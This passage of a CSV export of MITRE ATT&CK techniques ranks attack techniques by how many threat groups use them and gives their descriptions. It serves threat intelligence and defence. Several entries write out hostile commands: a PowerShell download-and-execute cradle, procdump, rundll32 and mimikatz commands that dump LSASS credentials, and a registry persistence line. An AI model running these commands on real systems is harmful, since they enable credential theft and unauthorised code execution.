technique_id,nb_groupes,attack_id,name,description,platforms,revoked,deprecated,created
attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e,86,T1204.002,Malicious File,"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.(Citation: Mandiant Trojanized Windows 10)

Adversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) 

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).","Linux, macOS, Windows",FALSE,FALSE,2020-03-11T14:49:36Z
attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add,86,T1105,Ingress Tool Transfer,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). 

On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)

Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)

Files can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.(Citation: Dropbox Malware Sync)","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:31:16Z
attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736,85,T1059.001,PowerShell,"Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",Windows,FALSE,FALSE,2020-03-09T13:48:55Z
attack-pattern--a2fdce72-04b2-409a-ac10-cc1695f4fce0,81,T1588.002,Tool,"Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). 

Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications.(Citation: Forescout Conti Leaks 2022)(Citation: Sentinel Labs Top Tier Target 2025)

Tool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software.(Citation: Recorded Future Beacon 2019)",PRE,FALSE,FALSE,2020-10-01T02:08:33Z
attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597,78,T1566.001,Spearphishing Attachment,"Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.","Linux, macOS, Windows",FALSE,FALSE,2020-03-02T19:05:18Z
attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62,73,T1059.003,Windows Command Shell,"Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)

Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",Windows,FALSE,FALSE,2020-03-09T14:12:31Z
attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2,61,T1036.005,Match Legitimate Resource Name or Location,"Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation. 

This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: `svchost.exe`). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes Backdoor 2023)","Containers, ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-02-10T20:43:10Z
attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1,57,T1082,System Information Discovery,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use this information to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. This behavior is distinct from [Local Storage Discovery](https://attack.mitre.org/techniques/T1680) which is an adversary's discovery of local drive, disks and/or volumes.

Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. Adversaries may leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get` and `system version get`.(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis)

Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)

[System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)","ESXi, IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:31:04Z
attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161,57,T1071.001,Web Protocols,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as HTTP/S(Citation: CrowdStrike Putter Panda) and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-15T16:13:46Z
attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279,56,T1547.001,Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.

The following run keys are created by default on Windows systems:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>. The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>.

The following Registry keys can be used to set startup folder items for persistence:

* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code>

The following Registry keys can control automatic startup of services during boot:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:

* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> run automatically for the currently logged-on user.

By default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.

Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",Windows,FALSE,FALSE,2020-01-23T22:02:48Z
attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9,54,T1053.005,Scheduled Task,"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)

An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)

Adversaries may also create ""hidden"" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments)",Windows,FALSE,FALSE,2019-11-27T14:58:00Z
attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18,51,T1083,File and Directory Discovery,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Many command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).(Citation: US-CERT-TA18-106A)

Some files and directories may require elevated or specific user permissions to access.","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:31:04Z
attack-pattern--ef67e13e-5598-4adc-bdb2-998225874fa9,49,T1204.001,Malicious Link,An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).,"Linux, macOS, Windows",FALSE,FALSE,2020-03-11T14:43:31Z
attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c,47,T1070.004,File Deletion,"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.

There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and `rm` on ESXi.","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-01-31T12:35:36Z
attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7,46,T1566.002,Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.

Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)

Adversaries may also utilize links to perform consent phishing/spearphishing campaigns to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s that grant immediate access to the victim environment. For example, a user may be lured into granting adversaries permissions/access via a malicious OAuth 2.0 request URL that when accepted by the user provide permissions/access for malicious applications.(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing 2021) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021)

Similarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as “device code phishing,” an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)","Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2020-03-02T19:15:44Z
attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67,46,T1059.005,Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)

Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)

Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )","Linux, macOS, Windows",FALSE,FALSE,2020-03-09T14:29:51Z
attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5,45,T1005,Data from Local System,"Adversaries may search local system sources, such as file systems, configuration files, local databases, virtual machine files, or process memory, to find files of interest and sensitive data prior to Exfiltration.

Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
","ESXi, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:20Z
attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81,45,T1078,Valid Accounts,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)","Containers, ESXi, IaaS, Identity Provider, Linux, macOS, Network Devices, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:31:00Z
attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c,44,T1190,Exploit Public-Facing Application,"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.

Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).

If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.

Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)

For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)","Containers, ESXi, IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3,44,T1583.001,Domains,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.

Adversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)

Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique)

Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)

Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)

In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.(Citation: Invictus IR DangerDev 2024)",PRE,FALSE,FALSE,2020-09-30T17:09:31Z
attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90,44,T1003.001,LSASS Memory,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

For example, on the target host use procdump:

* <code>procdump -ma lsass.exe lsass_dump</code>

Locally, mimikatz can be run using:

* <code>sekurlsa::Minidump lsassdump.dmp</code>
* <code>sekurlsa::logonPasswords</code>

Built-in Windows tools such as `comsvcs.dll` can also be used:

* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)

Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)

Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

The following SSPs can be used to access credentials:

* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
",Windows,FALSE,FALSE,2020-02-11T18:41:44Z
attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0,43,T1016,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).

